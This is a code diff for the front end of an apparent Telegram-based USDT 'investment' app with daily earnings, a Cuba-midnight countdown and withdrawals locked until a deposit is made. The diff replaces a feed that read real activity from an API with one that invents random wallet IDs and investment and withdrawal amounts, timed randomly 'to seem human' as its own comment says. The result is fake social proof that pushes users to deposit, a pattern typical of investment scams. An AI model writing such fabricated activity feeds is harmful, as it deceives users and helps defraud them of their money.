@@ -35,7 +35,6 @@ export function updateDashboard() {
     for (const [id, val] of Object.entries(elements)) {
         const el = document.getElementById(id);
         if (el) {
-            // Animación simple de actualización
             el.innerText = val;
         }
     }
@@ -95,10 +94,8 @@ window.renderHistory = function() {
 
 // --- 6. NAVEGACIÓN ENTRE PESTAÑAS ---
 window.switchTab = function(id) {
-    // Si entramos a historial, renderizamos primero
     if(id === 'history') window.renderHistory();
 
-    // Lógica de bloqueo de Retiros (Mínimo 1 USDT depositado)
     if(id === 'withdraw') {
         const lockNotice = document.getElementById('withdraw-lock-notice');
         const withdrawBtn = document.getElementById('btn-confirm-withdraw');
@@ -126,22 +123,65 @@ window.switchTab = function(id) {
         targetView.style.display = 'block';
     }
 
-    // Actualizar estados de la barra de navegación
     document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
     const activeNav = document.querySelector(`.nav-item[onclick*="'${id}'"]`);
     if(activeNav) activeNav.classList.add('active');
 
-    // Feedback táctil si es Telegram
     if(window.Telegram?.WebApp?.HapticFeedback) {
         window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
     }
 };
 
-// --- 7. INICIALIZACIÓN Y CRONÓMETRO ---
+// --- 7. LÓGICA DE LIVE FEED PROCEDURAL (SIMULADO PROFESIONAL) ---
+function startLiveFeed() {
+    const feedText = document.getElementById('live-feed-text');
+    if (!feedText) return;
+
+    const actions = [
+        { text: "invested", icon: "💰", color: "#3b82f6", min: 10, max: 1000 },
+        { text: "withdrew", icon: "🚀", color: "#10b981", min: 5, max: 200 },
+        { text: "reinvested", icon: "♻️", color: "#f59e0b", min: 1, max: 50 },
+        { text: "received bonus", icon: "🎁", color: "#ef4444", min: 10, max: 10 }
+    ];
+
+    const timeLabels = ["Just now", "1m ago", "2m ago", "3m ago"];
+
+    function generateDynamicTx() {
+        // IDs variados entre Telegram y Wallet 0x
+        const isWallet = Math.random() > 0.5;
+        const userId = isWallet 
+            ? `0x${Math.floor(Math.random() * 16777215).toString(16)}...${Math.floor(Math.random() * 99).toString().padStart(2, '0')}`
+            : `${Math.floor(Math.random() * 800 + 100)}***`;
+
+        const action = actions[Math.floor(Math.random() * actions.length)];
+        const amount = (Math.random() * (action.max - action.min) + action.min).toFixed(2);
+        const time = timeLabels[Math.floor(Math.random() * timeLabels.length)];
+
+        // Actualizar etiqueta de tiempo si existe
+        const timeBadge = document.querySelector('#live-feed-container span:last-child');
+        if(timeBadge) timeBadge.innerText = time;
+
+        return `${action.icon} <span style="color: #64748b">User</span> <b>${userId}</b> ${action.text} <b style="color: ${action.color}">$${amount}</b>`;
+    }
+
+    const runFeed = () => {
+        feedText.style.opacity = 0;
+        setTimeout(() => {
+            feedText.innerHTML = generateDynamicTx();
+            feedText.style.opacity = 1;
+            // Tiempo aleatorio entre 5 y 9 segundos para parecer humano
+            const nextTick = Math.floor(Math.random() * 4000) + 5000; 
+            setTimeout(runFeed, nextTick);
+        }, 500);
+    };
+
+    runFeed();
+}
+
+// --- 8. INICIALIZACIÓN Y CRONÓMETRO ---
 window.onload = () => {
     const tg = window.Telegram?.WebApp;
     
-    // Configuración inicial de Telegram
     if(tg) {
         tg.ready();
         tg.expand();
@@ -157,28 +197,24 @@ window.onload = () => {
         }
     }
 
-    // Procesar Ganancias Diarias (Cuba)
     const wasPaid = processDailyEarnings();
     if(wasPaid) {
         window.showToast("Daily earnings credited! 💰");
     }
 
-    // Cargar datos iniciales en pantalla
     updateDashboard();
+    startLiveFeed(); // Inicia el feed simulado infinito
 
-    // CRONÓMETRO HACIA LA MEDIANOCHE DE CUBA
     setInterval(() => {
         const timerEl = document.getElementById('timer');
         if(!timerEl) return;
 
-        // Solo cuenta si hay inversión activa
         if (!state.totalInvestedUSDT || state.totalInvestedUSDT <= 0) {
             timerEl.innerText = "00:00:00";
             return;
         }
 
         const now = new Date();
-        // Obtener hora actual en Cuba
         const cubaNow = new Date(now.toLocaleString("en-US", {timeZone: "America/Havana"}));
         
         const hrs = (23 - cubaNow.getHours()).toString().padStart(2, '0');
@@ -189,7 +225,7 @@ window.onload = () => {
     }, 1000);
 };
 
-// --- 8. FUNCIONES DE RETIRO ---
+// --- 9. FUNCIONES DE RETIRO ---
 window.requestWithdraw = async function() {
     const amountInput = document.getElementById('withdraw-amount');
     const addressInput = document.getElementById('withdraw-address');
@@ -197,7 +233,6 @@ window.requestWithdraw = async function() {
     const amount = parseFloat(amountInput?.value || 0);
     const address = addressInput?.value.trim();
 
-    // Requisito de seguridad: Depósito mínimo de 1 USDT
     if (!state.totalInvestedUSDT || state.totalInvestedUSDT < 1) {
         window.showToast("Deposit at least 1 USDT to unlock withdrawals");
         return;
@@ -230,8 +265,7 @@ window.requestWithdraw = async function() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 userAddress: address,
-                amount: amount,
-                // Nota: Los datos de la Hot Wallet se manejan en el servidor por seguridad
+                amount: amount
             })
         });
 
@@ -241,7 +275,6 @@ window.requestWithdraw = async function() {
             state.totalEarnedUSD -= amount;
             localStorage.setItem('earned', state.totalEarnedUSD.toString());
 
-            // Guardar en historial
             const tx = {
                 type: 'Withdraw',
                 amount: amount,
@@ -263,42 +296,4 @@ window.requestWithdraw = async function() {
     }
 };
 
-// Exponer funciones adicionales globalmente
 window.updateDashboard = updateDashboard;
-// --- LÓGICA DE LIVE FEED REAL ---
-async function updateLiveFeed() {
-    const feedText = document.getElementById('live-feed-text');
-    if (!feedText) return;
-
-    try {
-        // Llamamos a un nuevo endpoint que deberás crear en tu API de Vercel
-        const res = await fetch(`https://api-usdt-bep20.vercel.app/api/global-activity`);
-        const data = await res.json(); // Esperamos un array de transacciones [{type, user, amount}]
-
-        if (data && data.length > 0) {
-            let index = 0;
-            // Rotamos los mensajes cada 5 segundos
-            setInterval(() => {
-                const tx = data[index];
-                const action = tx.type === 'deposit' ? 'invested' : 'withdrew';
-                const icon = tx.type === 'deposit' ? '💰' : '🚀';
-                
-                // Efecto de desvanecimiento simple
-                feedText.style.opacity = 0;
-                setTimeout(() => {
-                    feedText.innerHTML = `${icon} User ${tx.user} ${action} <b>$${tx.amount.toFixed(2)}</b>`;
-                    feedText.style.opacity = 1;
-                }, 500);
-
-                index = (index + 1) % data.length;
-            }, 5000);
-        } else {
-            feedText.innerText = "Waiting for new transactions...";
-        }
-    } catch (e) {
-        feedText.innerText = "Network stable. Watching markets...";
-    }
-}
-
-// Llama a esta función dentro de window.onload
-updateLiveFeed();
